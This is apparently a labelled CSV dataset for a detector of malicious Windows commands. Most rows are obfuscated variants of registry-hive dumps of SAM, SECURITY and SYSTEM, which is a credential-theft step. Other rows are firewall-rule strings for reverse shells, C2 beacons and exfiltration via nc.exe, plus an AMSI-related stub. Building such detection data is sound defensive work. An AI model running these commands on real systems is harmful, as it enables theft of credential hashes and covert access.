text,label
reg save hklm\system c:\windows\temp\gag6pbms.save,1
reg save hklm\system c:\windows\temp\9zzmcfk7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\q7pjz8lu.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\04fz3qpn.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\system c:\windows\temp\av3jv7y9.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\lsfpma4g.dat""",1
reg save hklm\sam c:\windows\temp\rg6tsu4x.save,1
reg export hklm\security c:\windows\temp\90n1jhbq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\w5nvy60p.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\hs419y8m.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\d2exa5wi.dat""",1
reg export hklm\system c:\windows\temp\7tja5iyh.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\dyn9297j.dat""",1
reg export hklm\system c:\windows\temp\b7egs5wx.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\5slgu7si.save""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\1i4q66kf.save""",1
reg   save   hklm\security   c:\windows\temp\fvguvz7c.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\1qmy2rpa.dat""""",1
reg save hklm\sam c:\windows\temp\q9hx0ena.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\security c:\temp\sg0s7ewq.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\u074o1ha.save""",1
reg save hklm\sam c:\windows\temp\g0lkqwzj.save,1
reg save hklm\security c:\windows\temp\7ajj0v7m.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fqxwdpfj.dat""",1
reg   save   hklm\security   c:\windows\temp\md7w2f7h.save,1
reg export hklm\system c:\windows\temp\3d2pyhpb.save,1
reg export hklm\sam c:\windows\temp\536axift.save,1
reg save hklm\system c:\windows\temp\rc48teso.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\sed3bbcy.dat""",1
whoami  /groups,0
"cmd.exe /c ""reg save hklm\security c:\temp\ndbuy9yl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9vgr4eg5.dat""",1
reg save hklm\sam c:\windows\temp\vfl9crsg.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\oyeenmxx.dat""",1
"powershell -nop -c ""klist  purge""",3
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\v98v1hoi.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u6lwos7r.dat""",1
reg save hklm\security c:\windows\temp\4gawmhkl.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\8umiacu4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\e3d7cvck.dat""",1
reg export hklm\security c:\windows\temp\gb67xle5.save,1
reg   save   hklm\sam   c:\windows\temp\jfqvh4d8.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\p4u0fkq9.dat""",1
reg save hklm\sam c:\windows\temp\tgusxgar.save,1
reg save hklm\system c:\windows\temp\5xdebs6y.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\5qyx3cl7.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\exvx4gpv.dat""",1
reg export hklm\sam c:\windows\temp\p8wmvlx9.save,1
reg save hklm\security c:\windows\temp\6kbq5dlq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\56d1ivc8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ihcaex24.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\o5w6t74z.dat""",1
reg export hklm\sam c:\windows\temp\rpej1o99.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\security c:\windows\temp\k8xmm0pg.save,1
reg  save  hklm\system  c:\windows\temp\1y8sw2ps.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4m1k6wu1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\73v2hpme.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\o90aqh0s.save""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\j0ajp1js.dat""""",1
reg save hklm\sam c:\windows\temp\zcvi7dx6.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\nds58ffx.dat""",1
reg export hklm\system c:\windows\temp\mbon0f25.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\hy78ywow.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\62dfj8vj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s0hgjoob.dat""",1
reg  save  hklm\sam  c:\windows\temp\sohrnq3y.save,1
reg export hklm\system c:\windows\temp\8qilweqg.save,1
reg export hklm\sam c:\windows\temp\hn9gc4z1.save,1
reg export hklm\security c:\windows\temp\5uu4m44a.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\0ya518xk.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\1ogaeur1.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\94efj6s8.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\aju8zelm.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\tnerkqbq.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\k1n8belg.dat""",1
reg save hklm\system c:\windows\temp\5frkc8f3.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"powershell -nop -c ""reg export hklm\security c:\temp\y81svg9p.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\l90eky8b.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hdrhaoxg.dat""",1
ping  8.8.8.8,0
reg export hklm\system c:\windows\temp\y2b24md3.save,1
reg save hklm\sam c:\windows\temp\0zmkph5a.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\bdksn01g.dat""""",1
reg export hklm\sam c:\windows\temp\tgdwfkzl.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg  export  hklm\system  c:\windows\temp\e4r8377a.save,1
reg export hklm\system c:\windows\temp\mgvv8b2k.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\k46sm7s5.dat""",1
reg export hklm\system c:\windows\temp\dgyhhos7.save,1
reg save hklm\sam c:\windows\temp\iaqkkuwk.save,1
reg export hklm\system c:\windows\temp\asm3adrc.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\k04ytb2n.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\980hpynu.dat""",1
reg export hklm\sam c:\windows\temp\r2bbhhvd.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\hhf8p17o.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3big6v4m.dat""",1
reg export hklm\security c:\windows\temp\74lep0vi.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ns6mc90q.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\af9b0aj8.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fbu6cyid.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\km7wmf2k.dat""",1
reg save hklm\system c:\windows\temp\u0l8jinf.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\3k9c2ln1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\bbui63yl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ipu7sbzk.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\g623kdr7.save""",1
reg save hklm\system c:\windows\temp\qiqg8wk7.save,1
reg save hklm\security c:\windows\temp\hlx9m946.save,1
"powershell -nop -c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
reg export hklm\sam c:\windows\temp\ar9tbepm.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\bjbqj3o5.dat""""",1
rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\security c:\windows\temp\nnqjxtow.save,1
reg save hklm\system c:\windows\temp\tey2id35.save,1
reg save hklm\system c:\windows\temp\4ulq9734.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\6mkf8mof.dat""",1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\system c:\windows\temp\rfitgcfe.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\zb6mp72b.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\dp4vacnv.dat""""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\system c:\windows\temp\kbmt0efp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zes8r66o.dat""",1
reg save hklm\system c:\windows\temp\0cubmoj5.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\6a5k5e5e.save""",1
reg save hklm\system c:\windows\temp\j6wnnwxu.save,1
reg save hklm\system c:\windows\temp\lqtdbwgx.save,1
"[dllimport(""advapi32.dll"")] extern bool amsiutils(...)",3
"powershell -nop -c ""reg export hklm\security c:\temp\bgxlledx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\xu1kwaq0.dat""",1
reg export hklm\system c:\windows\temp\ktdu9usg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\s7gfx36e.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\uljs9zq7.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\a6taers2.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rgwso9cx.dat""",1
reg export hklm\system c:\windows\temp\7zlsyw7n.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\5kevnybu.dat""",1
reg save hklm\sam c:\windows\temp\stv5ezw7.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\system c:\windows\temp\3f3uucyr.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\u9g9p7q7.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\1lrj5r24.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jhd078po.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\c6qvw8y7.dat""",1
reg export hklm\system c:\windows\temp\oywida6f.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\ltqp2uti.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\e8rq15w5.dat""",1
